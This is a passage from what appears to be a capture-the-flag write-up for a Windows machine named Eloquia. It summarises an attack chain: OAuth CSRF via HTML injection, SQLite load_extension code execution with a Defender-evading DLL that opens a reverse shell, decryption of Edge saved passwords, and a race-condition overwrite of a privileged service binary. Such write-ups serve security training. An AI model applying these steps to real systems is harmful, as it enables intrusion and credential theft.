Trying to overwrite: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe
[+] SUCCESS
```

The overwrite succeeded. Shortly after, the service (running as a privileged account) restarted and executed our replacement binary instead of the legitimate one — which then copied the `root.txt` flag out to a readable location on Olivia's desktop.

### 5.8 Root flag

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Desktop> dir

    Directory: C:\Users\Olivia.KAT\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2024   1:53 PM           1558 Failure2Ban - Prototype - Shortcut.lnk
-a----         5/6/2024   2:00 PM        1331957 Logfile.PML
-ar---        3/17/2026   9:28 PM             34 root.txt
-a----        4/22/2024   7:02 AM            362 Todo.txt
```

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Desktop> type root.txt
[REDACTED ROOT FLAG]
```

System fully compromised.

---

## 6. Step-by-Step Summary

1. **Recon:** `nmap` shows only IIS (80) and WinRM (5985). Site on port 80 redirects to `eloquia.htb` → add to `/etc/hosts`.
2. **Vhost/dir brute force:** `ffuf` (subdomains) and `dirb` (directories) return almost nothing (`/about`, `/contact`). Manual browsing surfaces a linked companion app, `qooqle.htb` → add to `/etc/hosts`.
3. **OAuth logic flaw:** Eloquia's "Link Qooqle account" callback has **no `state` parameter**, meaning whoever's browser visits the callback URL with a given authorization code gets that Qooqle account linked to *their* Eloquia session.
4. **HTML injection:** the article submission/review feature (reviewed by admin) is vulnerable to HTML injection, giving a way to force the admin's browser to visit our OAuth callback URL.
5. **Exploit chain automation:** generate a compliant `banner.png` (`create.py`), capture our own CSRF token/session for the linking flow via Burp, then run `oauth.py <attacker_ip> <port> <csrf> <session>` to auto-create/report a malicious article, phish the admin, and capture the callback code the admin's browser generates.
6. **Admin takeover:** using the captured code, log in via "Sign in with Qooqle" → authenticated as **admin** on Eloquia.
7. **SQL Explorer discovered** in the admin panel; `PRAGMA database_list;` confirms a SQLite backend (`db.sqlite3`).
8. **Password hash cracking attempted** on dumped hashes — unsuccessful.
9. **CVE-2024-47881 (OpenRefine SQLite `load_extension` RCE)** applies: SQLite's `load_extension()` function can load a native DLL and execute it.
10. Standard `msfvenom` DLL is caught by Defender → build a **custom DLL** (`run.cpp` / `pch.h`) to avoid signature detection.
11. Upload `run.dll` disguised as the article banner image → lands at `static/assets/images/blog/run.dll`.
12. Start a `penelope` listener, then trigger `SELECT load_extension('static/assets/images/blog/run.dll');` in SQL Explorer → reverse shell as `eloquia\web`. **User flag captured.**
13. Enumerate `eloquia\web`'s Edge browser profile → find `Local State` (master key) + `Login Data` (encrypted saved logins).
14. Stage an SMB share from Kali (`impacket-smbserver`), pull down `pycryptodomex`/`pywin32` wheels and a custom `Decrypt.py`, copy the two Edge artifacts locally.
15. Run `Decrypt.py` → recovers saved credentials, including one explicitly for `http://eloquia.htb/accounts/login/` belonging to `Olivia.KAT`.
16. **Password reuse confirmed:** the same recovered password works against **WinRM** for the real Windows account `eloquia\olivia.kat` (verified with `evil-winrm`) — proving Olivia reused her web-app password as her domain password.
17. On Olivia's desktop, `Todo.txt` references an in-house service prototype, **"Failure2Ban"**, with known unfinished/buggy behavior (frequent restarts under load).
18. Confirm `Failure2Ban` is a registered **Windows service** (`reg query ... ImagePath`) pointing at a `.exe` under `Program Files`.
19. `icacls` reveals **Olivia has Write access** to the service's executable file — a privileged service running from a file we can overwrite.
20. Because the file briefly unlocks during service restarts (a **race condition window**), a malicious binary (`copy_flag.c`, compiled with `mingw-w64` and renamed to `Failure2Ban.exe`) is repeatedly copied over the real one using a PowerShell retry loop (`race.ps1`) until it lands successfully.
21. The service restarts, executes our malicious binary with its (privileged) service permissions, which copies out `root.txt`.
22. **Root flag captured** — full compromise of Eloquia.

---

## 7. Key Takeaways / Root Causes

- **Missing OAuth `state` parameter** → account-linking CSRF, letting an attacker link a victim's (including admin's) account to an attacker-controlled identity provider account.
- **HTML injection in an admin-reviewed workflow** → turns a "low value" content feature into a way to attack the admin's browser session.
- **Outdated/vulnerable OpenRefine-derived component (CVE-2024-47881)** → `enable_load_extension` on a SQLite integration is equivalent to remote code execution once an attacker can run arbitrary SQL and place a DLL somewhere reachable.
- **Browser-stored credentials + password reuse** → an encrypted-but-locally-decryptable credential store, combined with a user reusing their password across a web app and their domain account, turned a low-privileged foothold into a named-user session.
- **Weak file ACLs on a privileged Windows service binary** + **service restart behavior** → classic "write access to a SYSTEM-run binary" privilege escalation, exploited via a race condition since the file wasn't reliably lockable/immutable at rest.
